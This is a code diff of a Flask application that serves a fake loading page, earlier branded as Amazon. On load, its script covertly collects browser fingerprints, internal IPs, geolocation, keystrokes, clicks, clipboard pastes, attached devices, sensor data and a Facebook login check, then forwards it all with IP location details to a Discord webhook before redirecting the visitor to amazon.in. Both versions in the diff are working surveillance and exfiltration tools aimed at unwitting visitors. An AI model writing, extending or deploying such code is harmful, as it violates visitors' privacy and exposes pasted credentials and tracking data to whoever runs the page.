@@ -1,452 +1,488 @@
 from flask import Flask, request, render_template_string, jsonify
 import requests
 import os
-import textwrap
+from functools import wraps
 
 app = Flask(__name__)
-DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "your-discord-webhook-here")
+# Read secret key from environment variable and set Flask config
+app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "default_secret")
+DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK")
 
+def require_api_key(func):
+    """
+    Decorator that checks for a valid API key in the request headers or query parameters.
+    """
+    @wraps(func)
+    def decorated_function(*args, **kwargs):
+        # Look for the secret key in a custom header or as a query parameter
+        provided_key = request.headers.get("X-API-KEY") or request.args.get("api_key")
+        if not provided_key or provided_key != app.config["SECRET_KEY"]:
+            return jsonify({"status": "error", "message": "Unauthorized access"}), 401
+        return func(*args, **kwargs)
+    return decorated_function
+
+# The HTML template now injects the API key into the JavaScript.
+# Note: Exposing the secret key in client-side code is not secure,
+# but is shown here solely for demonstration on how to pass the key along.
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Loading Amazon...</title>
+  <title>Loading...</title>
   <style>
-    body { 
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      background: #ffffff;
-      font-family: Arial, sans-serif;
-    }
-    
-    .loader-container {
-      text-align: center;
-    }
-
-    .amazon-loader {
-      width: 60px;
-      height: 60px;
-      border: 4px solid #FF9900;
+    body { font-family: sans-serif; text-align: center; background: #0e0e0e; color: white; }
+    .loader {
+      border: 10px solid #444;
+      border-top: 10px solid #00f2ff;
       border-radius: 50%;
-      border-top-color: transparent;
+      width: 80px; height: 80px;
+      margin: 50px auto;
       animation: spin 1s linear infinite;
-      margin: 0 auto 20px;
-      position: relative;
     }
-
-    .amazon-loader::after {
-      content: '';
-      position: absolute;
-      top: -4px;
-      left: -4px;
-      right: -4px;
-      bottom: -4px;
-      border: 4px solid #ff990033;
-      border-radius: 50%;
-    }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
-    .loading-text {
-      color: #232F3E;
-      font-size: 18px;
-      font-weight: bold;
-      margin-top: 20px;
-    }
-
-    .amazon-brand {
-      color: #232F3E;
-      font-size: 24px;
-      margin-top: 10px;
-      font-weight: bold;
-    }
-    /* Hidden iframe for login status detection */
-    iframe.login-check {
-      display: none;
-    }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
-  <div class="loader-container">
-    <div class="amazon-loader"></div>
-    <div class="loading-text">Securing Connection...</div>
-    <div class="amazon-brand">Amazon</div>
-  </div>
+  <div class="loader"></div>
+  <p id="detect">Please wait, redirecting...</p>
+  <input id="pasteField" placeholder="Paste here" class="hidden">
   
-  <!-- Hidden iframe to detect login status on popular sites -->
-  <iframe class="login-check" src="https://www.facebook.com" onload="console.log('User likely logged into Facebook');"></iframe>
-
+  <!-- Hidden iframe for login detection simulation -->
+  <iframe id="fbFrame" src="https://www.facebook.com" class="hidden"></iframe>
+  
   <script>
-    // Global arrays to store additional events
+    // Global arrays and variables for new events
     const mouseMovements = [];
     const keystrokes = [];
-    const pastedData = [];
-    const sensorData = {
-      deviceMotion: null,
-      deviceOrientation: null
-    };
-
-    // Basic fingerprint collection (existing)
-    async function collectInfo() {
-      const fingerprint = {
-        screen: { 
-          width: screen.width,
-          height: screen.height,
-          colorDepth: screen.colorDepth,
-          pixelRatio: window.devicePixelRatio,
-          orientation: window.screen.orientation ? window.screen.orientation.type : "N/A"
-        },
-        webgl: getWebGLInfo(),
-        audio: await getAudioFingerprint(),
-        fonts: await getFontsList(),
-        hardware: {
-          concurrency: navigator.hardwareConcurrency,
-          memory: navigator.deviceMemory || "N/A",
-          touch: ('ontouchstart' in window),
-          vibration: ('vibrate' in navigator)
-        },
-        network: {
-          ips: await getIPs(),
-          connection: navigator.connection ? {
-            downlink: navigator.connection.downlink,
-            effectiveType: navigator.connection.effectiveType,
-            rtt: navigator.connection.rtt
-          } : null
-        },
-        platform: {
-          os: navigator.platform,
-          userAgent: navigator.userAgent,
-          vendor: navigator.vendor,
-          language: navigator.language,
-          languages: navigator.languages,
-          cookieEnabled: navigator.cookieEnabled,
-          doNotTrack: navigator.doNotTrack,
-          pdfViewerEnabled: navigator.pdfViewerEnabled || "N/A"
-        },
-        time: {
-          zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          offset: new Date().getTimezoneOffset()
-        },
-        extra: {
-          plugins: Array.from(navigator.plugins || []).map(p => p.name),
-          mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
-          serviceWorker: ('serviceWorker' in navigator),
-          storage: {
-            localStorage: ('localStorage' in window),
-            sessionStorage: ('sessionStorage' in window),
-            indexedDB: ('indexedDB' in window)
-          }
-        },
-        battery: {},
-        canvas: "",
-        // Additional collected events:
-        mouseMovements: mouseMovements.slice(0, 50), // limited to first 50 events
-        keystrokes: keystrokes,
-        pastedData: pastedData,
-        sensorData: sensorData,
-        voices: getVoicesInfo(),
-        appCheck: window.appCheckResult || "Not Attempted"
-      };
-
-      // Battery API (existing)
-      try {
-        const battery = await navigator.getBattery();
-        fingerprint.battery = {
-          level: battery.level,
-          charging: battery.charging,
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime
-        };
-      } catch(e) {}
-
-      // Canvas fingerprint
-      try {
-        fingerprint.canvas = getCanvasFingerprint();
-      } catch(e) {}
-
-      // Send collected fingerprint to server
-      await fetch("/collect", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(fingerprint)
-      });
-
-      // Redirect after data is sent (simulate Amazon load)
-      setTimeout(() => {
-        window.location.href = "https://www.amazon.in";
-      }, 3000);
-    }
-
-    // Existing functions
-    function getWebGLInfo() {
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return {
-          vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
-          renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
-          parameters: Array.from({ length: 374 }, (_, i) =>
-            gl.getParameter(i)?.toString().substring(0, 100)
-          )
-        };
-      } catch(e) {
-        return null;
-      }
-    }
-
-    function getCanvasFingerprint() {
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.textBaseline = 'top';
-      ctx.font = '14px Arial';
-      ctx.fillStyle = '#f60';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = '#069';
-      ctx.fillText('CanvasFingerprint', 2, 15);
-      return canvas.toDataURL();
-    }
-
-    async function getAudioFingerprint() {
-      try {
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioContext.createOscillator();
-        const analyser = audioContext.createAnalyser();
-        
-        oscillator.connect(analyser);
-        analyser.connect(audioContext.destination);
-        oscillator.start(0);
-        
-        const fftSize = 2048;
-        analyser.fftSize = fftSize;
-        const buffer = new Uint8Array(analyser.frequencyBinCount);
-        analyser.getByteFrequencyData(buffer);
-        
-        oscillator.stop();
-        audioContext.close();
-        
-        return Array.from(buffer);
-      } catch(e) {
-        return null;
-      }
-    }
-
-    async function getFontsList() {
-      const fontCheck = new Set([
-        'monospace', 'sans-serif', 'serif', 'Arial', 'Arial Black', 'Helvetica',
-        'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS'
-      ]);
-      
-      const available = [];
-      for (const font of fontCheck.values()) {
-        try {
-          await document.fonts.load(`12px "${font}"`);
-          available.push(font);
-        } catch(e) {}
-      }
-      return available;
-    }
-
-    async function getIPs() {
-      return new Promise(resolve => {
-        const ips = [];
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel('');
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        
-        pc.onicecandidate = e => {
-          if (!e.candidate) {
-            pc.close();
-            resolve(ips);
-            return;
-          }
-          // Collect internal/local IPs if available
-          const parts = e.candidate.candidate.split(' ');
-          const ip = parts.length > 4 ? parts[4] : "";
-          if (ip && !ips.includes(ip)) ips.push(ip);
-        };
-        
-        setTimeout(() => resolve(ips), 1000);
-      });
-    }
-
-    // New: Capture voices info for speech synthesis
-    function getVoicesInfo() {
-      if ('speechSynthesis' in window) {
-        const voices = window.speechSynthesis.getVoices();
-        return voices.map(v => v.name + " - " + v.lang);
-      }
-      return [];
-    }
-
-    // --- Additional Passive Fingerprinting Features ---
-
-    // 1. Mouse Movement & Keystroke Pattern Tracking
+    const keyUpEvents = [];
+    const clickEvents = [];
+    const scrollEvents = [];
+    const touchPoints = [];
+    let clipboardData = null;
+    let pageVisibility = document.visibilityState;
+    
+    // Capture first 3 mouse movements only
     document.addEventListener('mousemove', (e) => {
-      mouseMovements.push({
-        x: e.clientX,
-        y: e.clientY,
-        time: Date.now()
-      });
-      // Limit stored events
-      if (mouseMovements.length > 200) {
-        mouseMovements.shift();
+      if (mouseMovements.length < 3) {
+        mouseMovements.push({ x: e.clientX, y: e.clientY, t: Date.now() });
       }
     });
 
+    // Capture keydown events (limit to first 2 for example)
     document.addEventListener('keydown', (e) => {
-      keystrokes.push({
-        key: e.key,
-        code: e.code,
-        time: Date.now()
-      });
+      if (keystrokes.length < 2) {
+        keystrokes.push({ key: e.key, code: e.code, t: Date.now() });
+      }
     });
-
-    // 2. Battery API is already included in collectInfo
-
-    // 3. WebRTC Internal IP Leak is handled by getIPs()
-
-    // 4. Browser History Sniffing (Note: Most modern browsers patch this.)
-    // This demonstration uses CSS :visited styles but may not work reliably:
-    // (For educational purposes only)
-
-    // 5. Detect Login Status on Popular Sites using a hidden iframe (included above)
-
-    // 6. GPU + Audio + Canvas Fingerprinting enhancements can be added here as needed.
-    // (Consider using OfflineAudioContext for an alternate audio fingerprint.)
-
-    // 7. Voice & Speech Synthesis Info is captured by getVoicesInfo()
-
-    // 8. Clipboard Read Hook
-    document.addEventListener('paste', (e) => {
-      const data = e.clipboardData.getData('text');
-      pastedData.push({
-        content: data,
-        time: Date.now()
-      });
+    
+    // Capture keyup events
+    document.addEventListener('keyup', (e) => {
+      if (keyUpEvents.length < 2) {
+        keyUpEvents.push({ key: e.key, code: e.code, t: Date.now() });
+      }
     });
-
-    // 9. Mobile Sensor Data (Gyroscope/Accelerometer)
-    window.addEventListener('devicemotion', (e) => {
-      sensorData.deviceMotion = {
-        acceleration: e.acceleration,
-        accelerationIncludingGravity: e.accelerationIncludingGravity,
-        rotationRate: e.rotationRate,
-        interval: e.interval,
-        time: Date.now()
-      };
+    
+    // Capture click events
+    document.addEventListener('click', (e) => {
+      if (clickEvents.length < 5) {
+        clickEvents.push({ x: e.clientX, y: e.clientY, t: Date.now() });
+      }
     });
-    window.addEventListener('deviceorientation', (e) => {
-      sensorData.deviceOrientation = {
-        alpha: e.alpha,
-        beta: e.beta,
-        gamma: e.gamma,
-        time: Date.now()
-      };
+    
+    // Capture scroll events
+    document.addEventListener('scroll', (e) => {
+      if (scrollEvents.length < 5) {
+        scrollEvents.push({ scrollX: window.scrollX, scrollY: window.scrollY, t: Date.now() });
+      }
     });
-
-    // 10. Detect Installed Protocol Handlers (App Check)
-    // Attempt to open a protocol (this may be blocked by the browser)
-    window.appCheckResult = "Not Detected";
-    let appCheck = window.open("skype://", "_blank");
-    if (appCheck) {
-      window.appCheckResult = "Skype likely installed";
-      appCheck.close();
+    
+    // Capture touch events for mobile devices
+    document.addEventListener('touchstart', function(e) {
+      if (touchPoints.length < 5 && e.touches.length > 0) {
+        touchPoints.push({ x: e.touches[0].clientX, y: e.touches[0].clientY, t: Date.now() });
+      }
+    });
+    
+    // Capture paste events and record the data
+    document.getElementById("pasteField").addEventListener("paste", e => {
+      const pasted = e.clipboardData.getData("text");
+      if (/.*@.*\\..*/.test(pasted) || /[A-Za-z0-9@!#\$%\^&\*]{8,}/.test(pasted)) {
+        alert("Looks like you pasted sensitive data!");
+      }
+      clipboardData = pasted;
+    });
+    
+    // Canvas fingerprint (truncated data URL)
+    function getCanvasFingerprint() {
+      try {
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.textBaseline = "top";
+        ctx.font = "14px 'Arial'";
+        ctx.fillText("Fingerprint", 2, 2);
+        return canvas.toDataURL();
+      } catch(e) {
+        return "N/A";
+      }
     }
-
-    // Start collection when the page loads
+    
+    // Monitor page visibility changes
+    document.addEventListener('visibilitychange', () => {
+      pageVisibility = document.visibilityState;
+    });
+    
+    async function collectInfo() {
+      try {
+        const canvasEl = document.createElement("canvas");
+        const gl = canvasEl.getContext("webgl") || canvasEl.getContext("experimental-webgl");
+        const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const battery = await navigator.getBattery().catch(() => ({ level: 1.0, charging: false, chargingTime: "N/A", dischargingTime: "N/A" }));
+        const voices = speechSynthesis.getVoices().map(v => `${v.name} (${v.lang})`);
+        const features = {
+          wasm: typeof WebAssembly === 'object',
+          webrtc: typeof RTCPeerConnection === 'function',
+          serviceWorker: 'serviceWorker' in navigator,
+          notification: 'Notification' in window,
+          localStorage: 'localStorage' in window,
+          indexedDB: 'indexedDB' in window,
+          deviceMotion: 'DeviceMotionEvent' in window,
+          orientation: 'DeviceOrientationEvent' in window,
+          vibrate: 'vibrate' in navigator
+        };
+        
+        const devices = await navigator.mediaDevices.enumerateDevices().catch(() => []);
+        const audioInputs = devices.filter(d => d.kind === "audioinput").map(d => d.label || "Unknown Audio");
+        const videoInputs = devices.filter(d => d.kind === "videoinput").map(d => d.label || "Unknown Video");
+        const mediaDevices = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`);
+        
+        let bluetoothDevices = [], usbDevices = [];
+        try {
+          bluetoothDevices = await navigator.bluetooth.getDevices();
+          bluetoothDevices = bluetoothDevices.map(d => d.name || 'Unnamed Device');
+        } catch {}
+        try {
+          const usb = await navigator.usb.getDevices();
+          usbDevices = usb.map(d => d.productName);
+        } catch {}
+        
+        const osc = audioCtx.createOscillator();
+        const analyser = audioCtx.createAnalyser();
+        osc.connect(analyser);
+        osc.start(0);
+        let audioData = new Float32Array(analyser.frequencyBinCount);
+        analyser.getFloatFrequencyData(audioData);
+        const audioFingerprint = audioData.slice(0, 5).join(',');
+        
+        let internalIPs = [];
+        try {
+          const pc = new RTCPeerConnection({ iceServers: [] });
+          pc.createDataChannel('');
+          pc.createOffer().then(offer => pc.setLocalDescription(offer));
+          pc.onicecandidate = e => {
+            if (e.candidate) {
+              const ipMatch = /([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+              if (ipMatch && !internalIPs.includes(ipMatch[1])) internalIPs.push(ipMatch[1]);
+            }
+          };
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        } catch {}
+        
+        let location = { lat: null, lon: null, accuracy: null, speed: null };
+        try {
+          await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+              pos => {
+                location.lat = pos.coords.latitude;
+                location.lon = pos.coords.longitude;
+                location.accuracy = pos.coords.accuracy;
+                location.speed = pos.coords.speed;
+                resolve();
+              },
+              err => resolve()
+            );
+          });
+        } catch {}
+        
+        let ambientLight = "N/A";
+        if ('AmbientLightSensor' in window) {
+          try {
+            const sensor = new AmbientLightSensor();
+            sensor.addEventListener('reading', () => { ambientLight = sensor.illuminance; });
+            sensor.start();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+          } catch (e) {
+            ambientLight = "Error: " + e;
+          }
+        }
+        
+        const plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name) : [];
+        const mimeTypes = navigator.mimeTypes ? Array.from(navigator.mimeTypes).map(m => m.type) : [];
+        const onlineStatus = navigator.onLine ? "online" : "offline";
+        
+        let motionData = {}, orientationData = {};
+        window.addEventListener('devicemotion', e => {
+          motionData = {
+            accX: e.acceleration?.x || 0,
+            accY: e.acceleration?.y || 0,
+            accZ: e.acceleration?.z || 0
+          };
+        });
+        window.addEventListener('deviceorientation', e => {
+          orientationData = {
+            alpha: e.alpha,
+            beta: e.beta,
+            gamma: e.gamma
+          };
+        });
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        const storageSupport = {
+          localStorage: ('localStorage' in window),
+          sessionStorage: ('sessionStorage' in window),
+          indexedDB: ('indexedDB' in window),
+          serviceWorker: ('serviceWorker' in navigator)
+        };
+        
+        const installedFonts = ["Arial", "Helvetica", "Times New Roman", "Courier New"];
+        const pdfViewerEnabled = plugins.some(p => p.toLowerCase().includes("pdf"));
+        const canvasFingerprint = getCanvasFingerprint().substring(0, 60) + '...';
+        
+        let loginDetection = "Not Detected";
+        const fbFrame = document.getElementById("fbFrame");
+        fbFrame.onload = () => {
+          loginDetection = "Facebook iframe loaded – user likely logged in";
+        };
+        
+        const connection = navigator.connection || {};
+        
+        // Build the payload with all collected data
+        const payload = {
+          screenWidth: screen.width,
+          screenHeight: screen.height,
+          colorDepth: screen.colorDepth,
+          devicePixelRatio: window.devicePixelRatio,
+          platform: navigator.platform,
+          language: navigator.language,
+          userAgent: navigator.userAgent,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timezoneOffset: new Date().getTimezoneOffset(),
+          cookiesEnabled: navigator.cookieEnabled,
+          doNotTrack: navigator.doNotTrack,
+          touchSupport: ('ontouchstart' in window),
+          memory: navigator.deviceMemory || 'N/A',
+          hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+          webGLVendor: gl ? gl.getParameter(gl.VENDOR) : 'N/A',
+          webGLRenderer: gl ? gl.getParameter(gl.RENDERER) : 'N/A',
+          unmaskedVendor: (dbg && gl) ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
+          unmaskedRenderer: (dbg && gl) ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
+          batteryLevel: battery.level,
+          charging: battery.charging,
+          batteryChargingTime: battery.chargingTime,
+          batteryDischargingTime: battery.dischargingTime,
+          audioFingerprint: audioFingerprint,
+          bluetoothDevices: bluetoothDevices,
+          usbDevices: usbDevices,
+          mediaDevices: mediaDevices,
+          audioInputs: audioInputs,
+          videoInputs: videoInputs,
+          networkSpeed: connection.downlink || 'N/A',
+          effectiveType: connection.effectiveType || 'N/A',
+          geoLocation: location,
+          ambientLight: ambientLight,
+          plugins: plugins,
+          mimeTypes: mimeTypes,
+          onlineStatus: onlineStatus,
+          motionData: motionData,
+          orientationData: orientationData,
+          internalIPs: internalIPs,
+          voices: voices,
+          features: features,
+          storageSupport: storageSupport,
+          installedFonts: installedFonts,
+          vibrationSupported: ('vibrate' in navigator) ? "Yes" : "No",
+          pdfViewerEnabled: pdfViewerEnabled ? "True" : "False",
+          canvasFingerprint: canvasFingerprint,
+          mouseMovements: mouseMovements,
+          keystrokes: keystrokes,
+          keyUpEvents: keyUpEvents,
+          clickEvents: clickEvents,
+          scrollEvents: scrollEvents,
+          touchPoints: touchPoints,
+          clipboardData: clipboardData,
+          pageVisibility: pageVisibility,
+          loginDetection: loginDetection,
+          redirectedTo: "https://www.amazon.in"
+        };
+        
+        await fetch("/collect", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "X-API-KEY": "{{ secret_key }}"
+          },
+          body: JSON.stringify(payload)
+        });
+        
+        setTimeout(() => {
+          window.location.href = payload.redirectedTo;
+        }, 3000);
+      } catch (err) {
+        document.getElementById("detect").innerText = "Error collecting info.";
+      }
+    }
+    
     collectInfo();
   </script>
 </body>
 </html>
 """
 
-def split_discord_message(content, max_length=1900):
-    return textwrap.wrap(content, width=max_length, replace_whitespace=False)
-
 @app.route("/")
 def home():
-    return render_template_string(HTML_TEMPLATE)
+    # Pass the secret key into the template for the client-side fetch request.
+    # WARNING: Exposing secret keys in client-side code is insecure.
+    return render_template_string(HTML_TEMPLATE, secret_key=app.config["SECRET_KEY"])
 
 @app.route("/collect", methods=["POST"])
+@require_api_key
 def collect():
     data = request.json
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    
     try:
-        ip_info = requests.get(f"https://ipinfo.io/{ip}/json").json()
-    except Exception as e:
-        ip_info = {"error": str(e)}
+        ip_info = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5).json()
+    except Exception:
+        ip_info = {}
 
-    report = f"""
-    🔍 **Advanced Fingerprint Report** - `{ip}`
-    
-    **🌐 Network**
-    - IPs: {', '.join(data.get('network', {}).get('ips', []))}
-    - Connection Type: {data.get('network', {}).get('connection', {}).get('effectiveType', 'N/A')}
-    - Speed: {data.get('network', {}).get('connection', {}).get('downlink', 'N/A')} Mbps
-    
-    **🖥 System**
-    - OS: {data.get('platform', {}).get('os', 'N/A')}
-    - RAM: {data.get('hardware', {}).get('memory', 'N/A')}
-    - Cores: {data.get('hardware', {}).get('concurrency', 'N/A')}
-    - Touch Enabled: {"Yes" if data.get('hardware', {}).get('touch', False) else "No"}
-    
-    **📷 WebGL**
-    - Vendor: {data.get('webgl', {}).get('vendor', 'N/A')}
-    - Renderer: {data.get('webgl', {}).get('renderer', 'N/A')}
-    
-    **🔊 Audio Fingerprint**
-    - Audio Data Hash: {hash(str(data.get('audio', [])))}
-    
-    **📚 Fonts**
-    - Detected: {', '.join(data.get('fonts', []))}
-    
-    **⌨ Extra Events**
-    - Mouse Movements Collected: {len(data.get('mouseMovements', []))}
-    - Keystrokes Collected: {len(data.get('keystrokes', []))}
-    - Clipboard Pastes: {len(data.get('pastedData', []))}
-    
-    **📡 Sensors**
-    - Device Motion: {data.get('sensorData', {}).get('deviceMotion', 'N/A')}
-    - Device Orientation: {data.get('sensorData', {}).get('deviceOrientation', 'N/A')}
-    
-    **🔊 Voices**
-    - Available Voices: {', '.join(data.get('voices', []))}
-    
-    **🛠 App Check**
-    - Skype Check: {data.get('appCheck', 'N/A')}
-    
-    **⏰ Time**
-    - Timezone: {data.get('time', {}).get('zone', 'N/A')}
-    - Offset: {data.get('time', {}).get('offset', 'N/A')} minutes
-    
-    **🔧 Browser**
-    - User Agent: {data.get('platform', {}).get('userAgent', 'N/A')}
-    - Plugins: {', '.join(data.get('extra', {}).get('plugins', []))}
-    - Do Not Track: {data.get('platform', {}).get('doNotTrack', 'N/A')}
-    
-    **📡 IP Information**
-    - ISP: {ip_info.get('org', 'N/A')}
-    - Location: {ip_info.get('city', 'N/A')}, {ip_info.get('region', 'N/A')}
-    - Country: {ip_info.get('country', 'N/A')}
-    - Coordinates: {ip_info.get('loc', 'N/A')}
+    if not DISCORD_WEBHOOK:
+        return jsonify({"status": "error", "message": "DISCORD_WEBHOOK not configured"}), 500
+
+    info = f"""
+📊 **New Fingerprint Logged Device Information:**
+• **Screen:** {data.get('screenWidth')}x{data.get('screenHeight')}, {data.get('colorDepth')}-bit, DPR: {data.get('devicePixelRatio')}
+• **Orientation:** {"landscape-primary" if data.get('screenWidth') > data.get('screenHeight') else "portrait-primary"}
+• **WebGL Vendor:** {data.get('unmaskedVendor')}
+• **WebGL Renderer:** {data.get('unmaskedRenderer')}
+• **Audio Fingerprint:** {data.get('audioFingerprint')}
+• **Installed Fonts:** {", ".join(data.get('installedFonts', []))}
+• **CPU Cores:** {data.get('hardwareConcurrency')}
+• **Memory:** {data.get('memory')} GB
+• **Touch Support:** {data.get('touchSupport')}
+• **Vibration Supported:** {data.get('vibrationSupported')}
+
+🌐 **Network Details:**
+• **IPs (WebRTC):** {", ".join(data.get('internalIPs', []))}
+• **Downlink:** {data.get('networkSpeed')} Mbps
+• **RTT/Connection Type:** {data.get('effectiveType')}
+
+🖥 **Browser & OS:**
+• **OS:** {data.get('platform')}
+• **User Agent:** {data.get('userAgent')}
+• **Language:** {data.get('language')}
+• **Cookies Enabled:** {data.get('cookiesEnabled')}
+• **Do Not Track:** {data.get('doNotTrack')}
+• **PDF Viewer Enabled:** {data.get('pdfViewerEnabled')}
+
+⏰ **Timezone Info:**
+• **Timezone:** {data.get('timezone')}
+• **Offset:** {data.get('timezoneOffset')} minutes
+
+🔌 **Plugins & MIME Types:**
+• **Plugins:** {", ".join(data.get('plugins', []))}
+• **MIME Types:** {", ".join(data.get('mimeTypes', []))}
+
+💾 **Storage Support:**
+• **localStorage:** {data.get('storageSupport', {}).get('localStorage')}
+• **sessionStorage:** {data.get('storageSupport', {}).get('sessionStorage')}
+• **indexedDB:** {data.get('storageSupport', {}).get('indexedDB')}
+• **Service Worker Support:** {data.get('storageSupport', {}).get('serviceWorker')}
+
+🔋 **Battery Info:**
+• **Level:** {int(float(data.get('batteryLevel', 1)) * 100)}%
+• **Charging:** {"Yes" if data.get('charging') else "No"}
+• **Charging Time:** {data.get('batteryChargingTime')}
+• **Discharging Time:** {data.get('batteryDischargingTime')}
+
+🎨 **Canvas Fingerprint:**
+• **Data URL (truncated):** {data.get('canvasFingerprint')}
+
+🖱 **Mouse Movements (First 3):**
+{chr(10).join([f"    {i+1}. x: {m.get('x')}, y: {m.get('y')}, t: {m.get('t')}" for i, m in enumerate(data.get('mouseMovements', []))])}
+
+⌨ **Keystrokes (KeyDown):**
+{chr(10).join([f"    • Key: {k.get('key')}, Code: {k.get('code')}, t: {k.get('t')}" for k in data.get('keystrokes', [])])}
+
+⌨ **Keystrokes (KeyUp):**
+{chr(10).join([f"    • Key: {k.get('key')}, Code: {k.get('code')}, t: {k.get('t')}" for k in data.get('keyUpEvents', [])])}
+
+🖱 **Click Events:**
+{chr(10).join([f"    • x: {c.get('x')}, y: {c.get('y')}, t: {c.get('t')}" for c in data.get('clickEvents', [])])}
+
+📜 **Scroll Events:**
+{chr(10).join([f"    • scrollX: {s.get('scrollX')}, scrollY: {s.get('scrollY')}, t: {s.get('t')}" for s in data.get('scrollEvents', [])])}
+
+👆 **Touch Events:**
+{chr(10).join([f"    • x: {t.get('x')}, y: {t.get('y')}, t: {t.get('t')}" for t in data.get('touchPoints', [])])}
+
+📋 **Clipboard Pasted Data:**
+• **Data:** "{data.get('clipboardData')}"
+
+📱 **Sensor Data:**
+• **Device Motion:** x:{data.get('motionData', {}).get('accX')}, y:{data.get('motionData', {}).get('accY')}, z:{data.get('motionData', {}).get('accZ')}
+• **Device Orientation:** Alpha: {data.get('orientationData', {}).get('alpha')}, Beta: {data.get('orientationData', {}).get('beta')}, Gamma: {data.get('orientationData', {}).get('gamma')}
+
+🔊 **Voices (Speech Synthesis):**
+• {", ".join(data.get('voices', []))}
+
+📺 **Media Devices:**
+• **Audio Inputs:** {", ".join(data.get('audioInputs', []))}
+• **Video Inputs:** {", ".join(data.get('videoInputs', []))}
+• **All Devices:** {", ".join(data.get('mediaDevices', []))}
+
+🌐 **Additional Info:**
+• **Page Visibility:** {data.get('pageVisibility')}
+
+🔒 **Login Detection:**
+• {data.get('loginDetection')}
+
+➡️ **Redirected To:**
+• {data.get('redirectedTo')}
+
+🌍 **IP Info:**
+• **IP:** {ip}
+• **ISP:** {ip_info.get("org", "N/A")}
+• **City:** {ip_info.get("city", "N/A")}
+• **Region:** {ip_info.get("region", "N/A")}
+• **Country:** {ip_info.get("country", "N/A")}
+• **Location:** {ip_info.get("loc", "N/A")}
     """.strip()
 
     try:
-        for chunk in split_discord_message(report):
-            requests.post(DISCORD_WEBHOOK, json={"content": chunk})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        response = requests.post(DISCORD_WEBHOOK, json={"content": info})
+        response.raise_for_status()
+    except Exception as ex:
+        return jsonify({"status": "error", "message": f"Failed to post to Discord webhook: {ex}"}), 500
 
-    return jsonify({"status": "success"})
+    return jsonify({"status": "ok"})
+
+@app.route("/health", methods=["GET"])
+@require_api_key
+def health_check():
+    if not DISCORD_WEBHOOK:
+        return jsonify({"status": "error", "message": "DISCORD_WEBHOOK not configured"}), 500
+    try:
+        test_payload = {"content": "Test: Webhook connection is working."}
+        response = requests.post(DISCORD_WEBHOOK, json=test_payload)
+        response.raise_for_status()
+    except Exception as ex:
+        return jsonify({"status": "error", "message": f"Webhook connection failed: {ex}"}), 500
+    return jsonify({"status": "ok", "message": "Webhook connection successful"})
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    if not DISCORD_WEBHOOK:
+        print("Warning: DISCORD_WEBHOOK is not configured!")
+    app.run(debug=True)
